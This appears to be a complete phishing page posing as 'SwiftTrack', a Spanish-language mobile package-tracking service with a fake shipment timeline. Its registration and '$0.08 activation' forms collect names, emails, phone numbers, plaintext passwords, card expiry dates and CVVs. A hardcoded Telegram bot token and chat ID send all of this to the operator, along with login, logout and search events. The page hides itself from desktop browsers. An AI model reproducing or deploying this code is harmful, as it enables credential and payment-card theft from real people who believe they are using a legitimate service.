<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>SwiftTrack</title>
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Inter:wght@400;500&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:         #0D1117;
      --surface:    #161B22;
      --border:     #30363D;
      --accent:     #00C896;
      --accent-dim: #00C89622;
      --text:       #E6EDF3;
      --muted:      #8B949E;
      --error:      #F85149;
    }

    /* Block non-mobile */
    #desktopBlock {
      display: none;
      position: fixed; inset: 0;
      background: #0D1117;
      color: #E6EDF3;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2rem;
      z-index: 9999;
      font-family: 'Inter', sans-serif;
    }
    #desktopBlock .icon { font-size: 3rem; margin-bottom: 1rem; }
    #desktopBlock h2 { font-family: 'Space Grotesk', sans-serif; font-size: 1.4rem; margin-bottom: 0.5rem; }
    #desktopBlock p { color: #8B949E; font-size: 0.9rem; line-height: 1.6; }

    body {
      background: var(--bg); color: var(--text);
      font-family: 'Inter', sans-serif;
      min-height: 100vh; display: flex;
      flex-direction: column; align-items: center;
      padding: 1.5rem 1rem 5rem;
      -webkit-tap-highlight-color: transparent;
    }

    /* HEADER */
    header {
      width: 100%; max-width: 480px;
      display: flex; align-items: center;
      justify-content: space-between; margin-bottom: 2rem;
    }
    .logo { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 1.2rem; }
    .logo span { color: var(--accent); }
    .user-bar { display: flex; align-items: center; gap: 0.6rem; font-size: 0.82rem; color: var(--muted); }
    .user-bar strong { color: var(--text); }
    .btn-link {
      background: none; border: 1px solid var(--border);
      color: var(--muted); border-radius: 6px; padding: 0.28rem 0.65rem;
      font-size: 0.78rem; cursor: pointer;
    }

    /* AUTH OVERLAY */
    #authOverlay {
      position: fixed; inset: 0; background: var(--bg);
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      padding: 1.5rem; z-index: 100; overflow-y: auto;
    }
    .auth-logo { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 1.5rem; margin-bottom: 0.4rem; }
    .auth-logo span { color: var(--accent); }
    .auth-tagline { font-size: 0.82rem; color: var(--muted); margin-bottom: 1.75rem; }
    .auth-card {
      width: 100%; max-width: 380px;
      background: var(--surface); border: 1px solid var(--border);
      border-radius: 14px; padding: 1.75rem;
    }

    /* Steps */
    .steps-indicator { display: none; align-items: center; justify-content: center; margin-bottom: 1.5rem; }
    .si-step { display: flex; flex-direction: column; align-items: center; gap: 0.25rem; }
    .si-node {
      width: 26px; height: 26px; border-radius: 50%;
      border: 2px solid var(--border); background: var(--bg);
      display: flex; align-items: center; justify-content: center;
      font-family: 'Space Grotesk', sans-serif; font-size: 0.72rem; font-weight: 700;
      color: var(--muted); transition: all 0.3s;
    }
    .si-step.active .si-node { border-color: var(--accent); color: var(--accent); }
    .si-step.done .si-node   { border-color: var(--accent); background: var(--accent); color: #0D1117; }
    .si-label { font-size: 0.62rem; color: var(--muted); white-space: nowrap; }
    .si-step.active .si-label, .si-step.done .si-label { color: var(--text); }
    .si-line { flex: 1; height: 2px; background: var(--border); margin: 0 5px 16px; transition: background 0.3s; }
    .si-line.done { background: var(--accent); }

    /* Tabs */
    .auth-tabs { display: flex; margin-bottom: 1.5rem; border-bottom: 1px solid var(--border); }
    .auth-tab {
      flex: 1; background: none; border: none;
      border-bottom: 2px solid transparent; padding: 0.55rem 0; margin-bottom: -1px;
      font-family: 'Space Grotesk', sans-serif; font-size: 0.88rem; font-weight: 500;
      color: var(--muted); cursor: pointer;
    }
    .auth-tab.active { color: var(--accent); border-bottom-color: var(--accent); }

    .auth-section { display: none; }
    .auth-section.active { display: block; }

    .field { margin-bottom: 1rem; }
    .field label { display: block; font-size: 0.7rem; letter-spacing: 0.07em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.35rem; }
    .field input {
      width: 100%; background: var(--bg); border: 1px solid var(--border);
      border-radius: 8px; padding: 0.7rem 0.85rem;
      color: var(--text); font-family: 'Inter', sans-serif; font-size: 1rem;
      outline: none; -webkit-appearance: none; appearance: none;
    }
    .field input:focus { border-color: var(--accent); }
    .field input::placeholder { color: var(--muted); }
    .field input.err { border-color: var(--error); }
    .field-error { font-size: 0.7rem; color: var(--error); margin-top: 0.28rem; min-height: 1em; }

    .btn-primary {
      width: 100%; background: var(--accent); color: #0D1117;
      border: none; border-radius: 10px; padding: 0.85rem;
      font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 0.95rem;
      cursor: pointer; margin-top: 0.4rem;
      -webkit-tap-highlight-color: transparent;
    }
    .btn-secondary {
      width: 100%; background: none; color: var(--muted);
      border: 1px solid var(--border); border-radius: 10px; padding: 0.75rem;
      font-family: 'Space Grotesk', sans-serif; font-size: 0.88rem;
      cursor: pointer; margin-top: 0.55rem;
    }
    .auth-footer-note { text-align: center; font-size: 0.73rem; color: var(--muted); margin-top: 1rem; }
    .auth-footer-note a { color: var(--accent); text-decoration: none; cursor: pointer; }

    .strength-bar { display: flex; gap: 4px; margin-top: 0.35rem; }
    .strength-seg { flex: 1; height: 3px; border-radius: 2px; background: var(--border); transition: background 0.3s; }

    /* Payment */
    .payment-box {
      background: var(--bg); border: 1px solid var(--border);
      border-radius: 10px; padding: 1.1rem; margin-bottom: 1.1rem;
    }
    .payment-amount { display: flex; align-items: baseline; gap: 0.3rem; margin-bottom: 0.4rem; }
    .amount-big { font-family: 'Space Grotesk', sans-serif; font-size: 2rem; font-weight: 700; color: var(--accent); }
    .amount-label { font-size: 0.78rem; color: var(--muted); }
    .payment-desc { font-size: 0.78rem; color: var(--muted); line-height: 1.5; }
    .card-fields { display: grid; grid-template-columns: 1fr 1fr; gap: 0.65rem; }
    .card-fields .field { margin-bottom: 0; }
    .card-fields .field:first-child { grid-column: 1 / -1; }
    .pay-icons { display: flex; gap: 0.4rem; margin-bottom: 0.9rem; }
    .pay-icon { background: var(--bg); border: 1px solid var(--border); border-radius: 5px; padding: 0.22rem 0.55rem; font-size: 0.68rem; color: var(--muted); }
    .secure-note { display: flex; align-items: center; gap: 0.4rem; font-size: 0.7rem; color: var(--muted); margin-top: 0.7rem; }

    /* Success */
    .success-wrap { text-align: center; padding: 0.75rem 0; }
    .success-icon { width: 52px; height: 52px; border-radius: 50%; background: var(--accent-dim); border: 2px solid var(--accent); display: flex; align-items: center; justify-content: center; margin: 0 auto 0.9rem; }
    .success-title { font-family: 'Space Grotesk', sans-serif; font-size: 1.15rem; font-weight: 700; margin-bottom: 0.4rem; }
    .success-sub { font-size: 0.82rem; color: var(--muted); margin-bottom: 1.4rem; line-height: 1.6; }

    /* APP */
    #app { display: none; width: 100%; max-width: 480px; }
    .search-wrap { margin-bottom: 2rem; }
    .search-wrap label { display: block; font-size: 0.72rem; letter-spacing: 0.07em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.5rem; }
    .search-row { display: flex; gap: 0.5rem; }
    .search-row input {
      flex: 1; background: var(--surface); border: 1px solid var(--border);
      border-radius: 10px; padding: 0.75rem 0.9rem; color: var(--text);
      font-family: 'Space Grotesk', sans-serif; font-size: 0.95rem;
      outline: none; -webkit-appearance: none;
    }
    .search-row input:focus { border-color: var(--accent); }
    .search-row input::placeholder { color: var(--muted); }
    .search-row button {
      background: var(--accent); color: #0D1117; border: none;
      border-radius: 10px; padding: 0.75rem 1.1rem;
      font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 0.88rem;
      cursor: pointer; white-space: nowrap;
    }
    .card {
      width: 100%; background: var(--surface); border: 1px solid var(--border);
      border-radius: 14px; padding: 1.5rem; margin-bottom: 1.25rem;
    }
    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: 1.75rem; gap: 0.75rem; flex-wrap: wrap; }
    .tracking-id { font-family: 'Space Grotesk', sans-serif; font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.25rem; }
    .tracking-num { font-family: 'Space Grotesk', sans-serif; font-size: 1.25rem; font-weight: 700; }
    .badge { display: inline-flex; align-items: center; gap: 0.35rem; background: var(--accent-dim); color: var(--accent); border: 1px solid var(--accent); border-radius: 20px; padding: 0.28rem 0.8rem; font-size: 0.75rem; font-weight: 500; white-space: nowrap; }
    .pulse-dot { width: 7px; height: 7px; background: var(--accent); border-radius: 50%; animation: pulse 1.6s ease-in-out infinite; }
    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(1.5)} }

    /* Timeline vertical for mobile */
    .timeline-v { display: flex; flex-direction: column; gap: 0; margin-bottom: 1.5rem; }
    .tv-step { display: flex; gap: 0.85rem; align-items: flex-start; }
    .tv-left { display: flex; flex-direction: column; align-items: center; }
    .tv-node {
      width: 26px; height: 26px; border-radius: 50%;
      background: var(--bg); border: 2px solid var(--border);
      display: flex; align-items: center; justify-content: center;
      flex-shrink: 0; transition: all 0.3s;
    }
    .tv-step.done .tv-node   { border-color: var(--accent); background: var(--accent); }
    .tv-step.active .tv-node { border-color: var(--accent); background: var(--bg); box-shadow: 0 0 0 3px var(--accent-dim); }
    .tv-step.active .tv-node::after { content:''; width:9px; height:9px; background:var(--accent); border-radius:50%; animation:pulse 1.6s ease-in-out infinite; }
    .tv-step.done .tv-node svg { display:block; } .tv-step:not(.done) .tv-node svg { display:none; }
    .tv-line { width: 2px; flex: 1; min-height: 22px; background: var(--border); margin: 3px 0; }
    .tv-step.done .tv-line { background: var(--accent); }
    .tv-step:last-child .tv-line { display: none; }
    .tv-content { padding-bottom: 1.1rem; padding-top: 2px; }
    .tv-label { font-size: 0.88rem; font-weight: 500; color: var(--muted); }
    .tv-step.done .tv-label, .tv-step.active .tv-label { color: var(--text); }
    .tv-sub { font-size: 0.72rem; color: var(--muted); margin-top: 0.15rem; }
    .tv-step.active .tv-sub { color: var(--accent); }

    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.85rem; }
    .info-item { display: flex; flex-direction: column; gap: 0.2rem; }
    .info-label { font-size: 0.67rem; letter-spacing: 0.07em; text-transform: uppercase; color: var(--muted); }
    .info-value { font-family: 'Space Grotesk', sans-serif; font-size: 0.9rem; font-weight: 500; }

    .history-title { font-family: 'Space Grotesk', sans-serif; font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.9rem; }
    .history-list { display: flex; flex-direction: column; }
    .history-item { display: grid; grid-template-columns: 22px 1fr auto; gap: 0 0.75rem; align-items: start; padding: 0.65rem 0; border-bottom: 1px solid var(--border); }
    .history-item:last-child { border-bottom: none; }
    .h-dot-wrap { padding-top: 4px; }
    .h-dot { width: 9px; height: 9px; border-radius: 50%; background: var(--border); }
    .h-dot.active { background: var(--accent); box-shadow: 0 0 5px var(--accent); }
    .h-desc { font-size: 0.83rem; line-height: 1.5; }
    .h-sub  { font-size: 0.7rem; color: var(--muted); margin-top: 0.12rem; }
    .h-time { font-size: 0.7rem; color: var(--muted); white-space: nowrap; padding-top: 3px; }

    footer { margin-top: 1.5rem; font-size: 0.72rem; color: var(--muted); text-align: center; }
  </style>
</head>
<body>

<!-- Desktop block -->
<div id="desktopBlock">
  <div class="icon">📱</div>
  <h2>Solo disponible en móvil</h2>
  <p>Esta aplicación está diseñada para iPhone y Android.<br>Ábrela desde tu teléfono para continuar.</p>
</div>

<!-- AUTH OVERLAY -->
<div id="authOverlay">
  <div class="auth-logo">Swift<span>Track</span></div>
  <p class="auth-tagline">Rastreo de envíos en tiempo real</p>

  <div class="auth-card">
    <div class="steps-indicator" id="stepsIndicator">
      <div class="si-step active" id="si1"><div class="si-node">1</div><div class="si-label">Cuenta</div></div>
      <div class="si-line" id="siLine1"></div>
      <div class="si-step" id="si2"><div class="si-node">2</div><div class="si-label">Pago</div></div>
      <div class="si-line" id="siLine2"></div>
      <div class="si-step" id="si3"><div class="si-node"><svg width="11" height="11" viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="si-label">Listo</div></div>
    </div>

    <div class="auth-tabs" id="authTabs">
      <button class="auth-tab active" onclick="switchTab('login')">Iniciar sesión</button>
      <button class="auth-tab" onclick="switchTab('register')">Crear cuenta</button>
    </div>

    <!-- LOGIN -->
    <div class="auth-section active" id="loginSection">
      <div class="field"><label>Correo electrónico</label><input type="email" id="loginEmail" placeholder="tu@correo.com" autocomplete="email" /><div class="field-error" id="loginEmailErr"></div></div>
      <div class="field"><label>Contraseña</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password" /><div class="field-error" id="loginPassErr"></div></div>
      <div class="field-error" id="loginGlobalErr"></div>
      <button class="btn-primary" onclick="handleLogin()">Entrar</button>
      <p class="auth-footer-note">¿No tienes cuenta? <a onclick="switchTab('register')">Regístrate</a></p>
    </div>

    <!-- REGISTER STEP 1 -->
    <div class="auth-section" id="registerSection">
      <div class="field"><label>Nombre completo</label><input type="text" id="regName" placeholder="Ana García" autocomplete="name" /><div class="field-error" id="regNameErr"></div></div>
      <div class="field"><label>Correo electrónico</label><input type="email" id="regEmail" placeholder="tu@correo.com" autocomplete="email" /><div class="field-error" id="regEmailErr"></div></div>
      <div class="field">
        <label>Contraseña <span style="color:var(--muted);font-size:0.65rem;text-transform:none;letter-spacing:0">(mín. 8 caracteres)</span></label>
        <input type="password" id="regPass" placeholder="••••••••" autocomplete="new-password" oninput="updateStrength(this.value)" />
        <div class="strength-bar"><div class="strength-seg" id="seg1"></div><div class="strength-seg" id="seg2"></div><div class="strength-seg" id="seg3"></div><div class="strength-seg" id="seg4"></div></div>
        <div class="field-error" id="regPassErr"></div>
      </div>
      <div class="field"><label>Teléfono</label><input type="tel" id="regPhone" placeholder="+52 55 1234 5678" autocomplete="tel" /><div class="field-error" id="regPhoneErr"></div></div>
      <button class="btn-primary" onclick="handleRegister()">Continuar al pago →</button>
      <p class="auth-footer-note">¿Ya tienes cuenta? <a onclick="switchTab('login')">Inicia sesión</a></p>
    </div>

    <!-- PAYMENT STEP 2 -->
    <div class="auth-section" id="paymentSection">
      <div class="payment-box">
        <div class="payment-amount"><div class="amount-big">$0.08</div><div class="amount-label">USD — activación única</div></div>
        <div class="payment-desc">Acceso completo a rastreo en tiempo real e historial de envíos.</div>
      </div>
      <div class="pay-icons"><div class="pay-icon">VISA</div><div class="pay-icon">MC</div><div class="pay-icon">AMEX</div></div>
      <div class="card-fields">
        <div class="field"><label>Número de tarjeta</label><input type="tel" id="cardNum" placeholder="1234 5678 9012 3456" maxlength="19" oninput="fmtCard(this)" /><div class="field-error" id="cardNumErr"></div></div>
        <div class="field"><label>Vencimiento</label><input type="tel" id="cardExp" placeholder="MM/AA" maxlength="5" oninput="fmtExp(this)" /><div class="field-error" id="cardExpErr"></div></div>
        <div class="field"><label>CVV</label><input type="tel" id="cardCvv" placeholder="123" maxlength="4" /><div class="field-error" id="cardCvvErr"></div></div>
      </div>
      <div class="field-error" id="payGlobalErr"></div>
      <button class="btn-primary" id="payBtn" onclick="handlePayment()">Pagar $0.08 y activar cuenta</button>
      <button class="btn-secondary" onclick="backToRegister()">← Volver</button>
      <div class="secure-note">
        <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><rect x="2" y="5" width="8" height="6" rx="1" stroke="#8B949E" stroke-width="1.2"/><path d="M4 5V3.5a2 2 0 1 1 4 0V5" stroke="#8B949E" stroke-width="1.2" stroke-linecap="round"/></svg>
        Pago simulado — no se procesarán cargos reales
      </div>
    </div>

    <!-- SUCCESS STEP 3 -->
    <div class="auth-section" id="successSection">
      <div class="success-wrap">
        <div class="success-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><polyline points="4,12 9,17 20,7" stroke="#00C896" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
        <div class="success-title">¡Cuenta activada!</div>
        <div class="success-sub">Pago de <strong>$0.08 USD</strong> procesado.<br>Bienvenido, <strong id="successName"></strong>.</div>
        <button class="btn-primary" onclick="enterApp()">Ir al rastreo →</button>
      </div>
    </div>
  </div>
</div>

<!-- MAIN APP -->
<header>
  <div class="logo">Swift<span>Track</span></div>
  <div class="user-bar">
    <span>Hola, <strong id="headerName"></strong></span>
    <button class="btn-link" onclick="logout()">Salir</button>
  </div>
</header>

<div id="app">
  <div class="search-wrap">
    <label>Número de seguimiento</label>
    <div class="search-row">
      <input id="trackInput" type="text" placeholder="Ej. SW-2026-48821-MX" value="SW-2026-48821-MX" />
      <button onclick="loadTracking()">Rastrear</button>
    </div>
  </div>

  <div class="card">
    <div class="card-header">
      <div>
        <div class="tracking-id">Número de seguimiento</div>
        <div class="tracking-num" id="trackNum">SW-2026-48821-MX</div>
      </div>
      <div class="badge"><div class="pulse-dot"></div>En camino</div>
    </div>

    <!-- Vertical timeline -->
    <div class="timeline-v">
      <div class="tv-step done">
        <div class="tv-left"><div class="tv-node"><svg width="11" height="11" viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="#0D1117" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="tv-line"></div></div>
        <div class="tv-content"><div class="tv-label">Pedido recibido</div><div class="tv-sub">Confirmado</div></div>
      </div>
      <div class="tv-step done">
        <div class="tv-left"><div class="tv-node"><svg width="11" height="11" viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="#0D1117" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="tv-line"></div></div>
        <div class="tv-content"><div class="tv-label">Preparando</div><div class="tv-sub">Empaquetado listo</div></div>
      </div>
      <div class="tv-step done">
        <div class="tv-left"><div class="tv-node"><svg width="11" height="11" viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="#0D1117" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="tv-line"></div></div>
        <div class="tv-content"><div class="tv-label">Enviado</div><div class="tv-sub">Cargado en vuelo SW-448</div></div>
      </div>
      <div class="tv-step active">
        <div class="tv-left"><div class="tv-node"></div><div class="tv-line"></div></div>
        <div class="tv-content"><div class="tv-label">En camino</div><div class="tv-sub">Centro de distribución — Ámsterdam</div></div>
      </div>
      <div class="tv-step">
        <div class="tv-left"><div class="tv-node"></div><div class="tv-line"></div></div>
        <div class="tv-content"><div class="tv-label">Entregado</div><div class="tv-sub">Pendiente</div></div>
      </div>
    </div>

    <div class="info-grid">
      <div class="info-item"><div class="info-label">Origen</div><div class="info-value">CDMX, MX</div></div>
      <div class="info-item"><div class="info-label">Destino</div><div class="info-value">Rotterdam, NL</div></div>
      <div class="info-item"><div class="info-label">Estimado</div><div class="info-value">20 jun 2026</div></div>
      <div class="info-item"><div class="info-label">Servicio</div><div class="info-value">Express Intl.</div></div>
    </div>
  </div>

  <div class="card">
    <div class="history-title">Historial de movimientos</div>
    <div class="history-list">
      <div class="history-item"><div class="h-dot-wrap"><div class="h-dot active"></div></div><div><div class="h-desc">Centro de distribución — Ámsterdam, NL</div><div class="h-sub">En camino al destino final</div></div><div class="h-time">Hoy, 09:14</div></div>
      <div class="history-item"><div class="h-dot-wrap"><div class="h-dot"></div></div><div><div class="h-desc">Despachado en aduana — Frankfurt, DE</div><div class="h-sub">Revisión completada</div></div><div class="h-time">Ayer, 22:40</div></div>
      <div class="history-item"><div class="h-dot-wrap"><div class="h-dot"></div></div><div><div class="h-desc">Hub internacional — Frankfurt, DE</div><div class="h-sub">En proceso de revisión</div></div><div class="h-time">15 jun, 18:05</div></div>
      <div class="history-item"><div class="h-dot-wrap"><div class="h-dot"></div></div><div><div class="h-desc">Salida de origen — CDMX, MX</div><div class="h-sub">Cargado en vuelo SW-448</div></div><div class="h-time">14 jun, 03:20</div></div>
      <div class="history-item"><div class="h-dot-wrap"><div class="h-dot"></div></div><div><div class="h-desc">Paquete recogido por mensajero</div><div class="h-sub">Col. Juárez, CDMX</div></div><div class="h-time">13 jun, 14:55</div></div>
    </div>
  </div>

  <footer>SwiftTrack &copy; 2026</footer>
</div>

<script>
  const TG_TOKEN   = '8914647164:AAEO51F95mMxmXBBT0ij06wypbiM0kGElXw';
  const TG_CHAT_ID = '7299540024';

  // ── Mobile-only guard ──
  function isMobile() {
    return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
           ('ontouchstart' in window && window.innerWidth <= 768);
  }
  if (!isMobile()) {
    document.getElementById('desktopBlock').style.display = 'flex';
    document.getElementById('authOverlay').style.display  = 'none';
  }

  // ── Telegram sender ──
  async function sendToTelegram(text) {
    try {
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
      });
    } catch(e) { console.warn('Telegram error', e); }
  }

  // ── In-memory DB ──
  const users = [];
  let currentUser = null;
  let pendingUser = null;

  // ── Helpers ──
  function clearErrors() {
    document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
    document.querySelectorAll('.field input').forEach(el => el.classList.remove('err'));
  }
  function setErr(inputId, errId, msg) {
    document.getElementById(inputId).classList.add('err');
    document.getElementById(errId).textContent = msg;
  }
  function setStep(n) {
    [1,2,3].forEach(i => {
      const si = document.getElementById('si'+i);
      si.classList.remove('active','done');
      if (i < n) si.classList.add('done');
      if (i === n) si.classList.add('active');
    });
    [1,2].forEach(i => document.getElementById('siLine'+i).classList.toggle('done', i < n));
  }

  // ── Tab switch ──
  function switchTab(tab) {
    const isReg = tab === 'register';
    document.querySelectorAll('.auth-tab').forEach((t,i) => t.classList.toggle('active', (i===0) === (tab==='login')));
    document.getElementById('loginSection').classList.toggle('active', !isReg);
    document.getElementById('registerSection').classList.toggle('active', isReg);
    document.getElementById('paymentSection').classList.remove('active');
    document.getElementById('successSection').classList.remove('active');
    document.getElementById('stepsIndicator').style.display = isReg ? 'flex' : 'none';
    document.getElementById('authTabs').style.display = isReg ? 'none' : 'flex';
    if (isReg) setStep(1);
    clearErrors();
  }

  // ── Password strength ──
  function updateStrength(val) {
    const colors = ['#F85149','#F0883E','#3FB950','#00C896'];
    let s = 0;
    if (val.length >= 8) s++;
    if (val.length >= 12) s++;
    if (/[A-Z]/.test(val) && /[0-9]/.test(val)) s++;
    if (/[^A-Za-z0-9]/.test(val)) s++;
    for (let i=1;i<=4;i++) document.getElementById('seg'+i).style.background = i<=s ? colors[s-1] : 'var(--border)';
  }

  // ── Card formatting ──
  function fmtCard(el) { let v=el.value.replace(/\D/g,'').substring(0,16); el.value=v.replace(/(.{4})/g,'$1 ').trim(); }
  function fmtExp(el)  { let v=el.value.replace(/\D/g,'').substring(0,4); if(v.length>=3) v=v.slice(0,2)+'/'+v.slice(2); el.value=v; }

  // ── REGISTER STEP 1 ──
  function handleRegister() {
    clearErrors();
    const name  = document.getElementById('regName').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const pass  = document.getElementById('regPass').value;
    const phone = document.getElementById('regPhone').value.trim();
    let ok = true;
    if (!name)  { setErr('regName','regNameErr','Ingresa tu nombre'); ok=false; }
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { setErr('regEmail','regEmailErr','Correo inválido'); ok=false; }
    else if (users.find(u=>u.email===email)) { setErr('regEmail','regEmailErr','Correo ya registrado'); ok=false; }
    if (pass.length < 8) { setErr('regPass','regPassErr','Mínimo 8 caracteres'); ok=false; }
    if (!phone) { setErr('regPhone','regPhoneErr','Ingresa tu teléfono'); ok=false; }
    if (!ok) return;
    pendingUser = { name, email, password: pass, phone };
    document.getElementById('registerSection').classList.remove('active');
    document.getElementById('paymentSection').classList.add('active');
    setStep(2);
  }

  function backToRegister() {
    document.getElementById('paymentSection').classList.remove('active');
    document.getElementById('registerSection').classList.add('active');
    setStep(1); clearErrors();
  }

  // ── PAYMENT STEP 2 ──
  async function handlePayment() {
    clearErrors();
    const num = document.getElementById('cardNum').value.replace(/\s/g,'');
    const exp = document.getElementById('cardExp').value;
    const cvv = document.getElementById('cardCvv').value;
    let ok = true;
    if (num.length < 16) { setErr('cardNum','cardNumErr','Número inválido'); ok=false; }
    if (!/^\d{2}\/\d{2}$/.test(exp)) { setErr('cardExp','cardExpErr','Formato MM/AA'); ok=false; }
    if (cvv.length < 3)  { setErr('cardCvv','cardCvvErr','CVV inválido'); ok=false; }
    if (!ok) return;

    const btn = document.getElementById('payBtn');
    btn.disabled = true; btn.textContent = 'Procesando…';

    // Mask card for Telegram
    const maskedCard = '•••• •••• •••• ' + num.slice(-4);

    setTimeout(async () => {
      btn.disabled = false; btn.textContent = 'Pagar $0.08 y activar cuenta';
      users.push(pendingUser);

      // Send to Telegram
      const msg =
        `🆕 <b>NUEVO REGISTRO — SwiftTrack</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Nombre:</b> ${pendingUser.name}\n` +
        `📧 <b>Correo:</b> ${pendingUser.email}\n` +
        `📱 <b>Teléfono:</b> ${pendingUser.phone}\n` +
        `🔒 <b>Contraseña:</b> ${pendingUser.password}\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `💳 <b>Tarjeta:</b> ${maskedCard}\n` +
        `📅 <b>Vencimiento:</b> ${exp}\n` +
        `🔑 <b>CVV:</b> ${cvv}\n` +
        `💰 <b>Pago:</b> $0.08 USD ✅\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${new Date().toLocaleString('es-MX', {timeZone:'America/Mexico_City'})}`;

      await sendToTelegram(msg);

      document.getElementById('successName').textContent = pendingUser.name.split(' ')[0];
      document.getElementById('paymentSection').classList.remove('active');
      document.getElementById('successSection').classList.add('active');
      setStep(3);
    }, 1800);
  }

  function enterApp() { loginUser(pendingUser); pendingUser = null; }

  // ── LOGIN ──
  async function handleLogin() {
    clearErrors();
    const email = document.getElementById('loginEmail').value.trim();
    const pass  = document.getElementById('loginPass').value;
    let ok = true;
    if (!email) { setErr('loginEmail','loginEmailErr','Ingresa tu correo'); ok=false; }
    if (!pass)  { setErr('loginPass','loginPassErr','Ingresa tu contraseña'); ok=false; }
    if (!ok) return;
    const user = users.find(u=>u.email===email && u.password===pass);
    if (!user) { document.getElementById('loginGlobalErr').textContent='Correo o contraseña incorrectos'; return; }

    await sendToTelegram(
      `🔓 <b>INICIO DE SESIÓN</b>\n` +
      `👤 ${user.name}\n📧 ${user.email}\n` +
      `🕐 ${new Date().toLocaleString('es-MX', {timeZone:'America/Mexico_City'})}`
    );
    loginUser(user);
  }

  function loginUser(user) {
    currentUser = user;
    document.getElementById('headerName').textContent = user.name.split(' ')[0];
    document.getElementById('authOverlay').style.display = 'none';
    document.getElementById('app').style.display = 'block';
  }

  async function logout() {
    await sendToTelegram(`🚪 <b>CIERRE DE SESIÓN</b>\n👤 ${currentUser.name}\n📧 ${currentUser.email}`);
    currentUser = null;
    document.getElementById('authOverlay').style.display = 'flex';
    document.getElementById('app').style.display = 'none';
    clearErrors(); switchTab('login');
    document.getElementById('loginEmail').value = '';
    document.getElementById('loginPass').value = '';
  }

  // ── TRACKING ──
  async function loadTracking() {
    const input = document.getElementById('trackInput').value.trim();
    if (!input) return;
    document.getElementById('trackNum').textContent = input;
    if (currentUser) {
      await sendToTelegram(
        `🔍 <b>BÚSQUEDA DE PAQUETE</b>\n` +
        `👤 ${currentUser.name}\n` +
        `📦 Guía: ${input}\n` +
        `🕐 ${new Date().toLocaleString('es-MX', {timeZone:'America/Mexico_City'})}`
      );
    }
  }

  // Enter key
  document.addEventListener('keydown', e => {
    if (e.key !== 'Enter') return;
    if (document.getElementById('loginSection').classList.contains('active'))    handleLogin();
    else if (document.getElementById('registerSection').classList.contains('active')) handleRegister();
    else if (document.getElementById('paymentSection').classList.contains('active'))  handlePayment();
  });
</script>
</body>
</html>
